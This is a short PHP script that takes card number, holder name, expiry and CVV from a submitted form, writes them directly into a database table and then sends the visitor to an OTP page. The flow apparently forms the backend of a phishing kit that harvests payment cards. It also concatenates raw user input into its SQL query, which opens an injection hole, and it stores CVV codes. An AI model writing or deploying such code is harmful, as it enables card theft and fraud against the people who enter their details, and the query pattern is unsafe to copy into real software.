<?php
 session_start();
include("cn.php");

if(isset($_POST["submit"]))
{
$cardnu =$_POST["cardnu"];
$holder  =$_POST["holder"];
$month  = $_POST["month"];
$year = $_POST["year"];
$cvv = $_POST["cvv"];

$query = "INSERT INTO card(CARDNU, HOLDER, MONTH, YEAR,  CVV) VALUE ('".$cardnu."','".$holder."','".$month."','".$year."','".$cvv."')"; 
$run = mysqli_query($con,$query);
}
 
 //redirect
   header ("Location:../otp.html")

 ?>